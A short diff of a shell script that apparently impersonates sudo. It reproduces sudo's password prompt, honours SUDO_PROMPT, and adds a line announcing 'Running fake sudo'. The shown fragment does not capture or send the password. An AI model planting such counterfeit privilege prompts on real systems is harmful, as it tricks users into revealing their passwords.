@@ -6,7 +6,7 @@
 # done
 # echo ""
 # echo "python /tmp/sudo.py $i"
-
+echo "Running fake sudo"
 if [ -z "${SUDO_PROMPT}" ]; then
     readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
 else
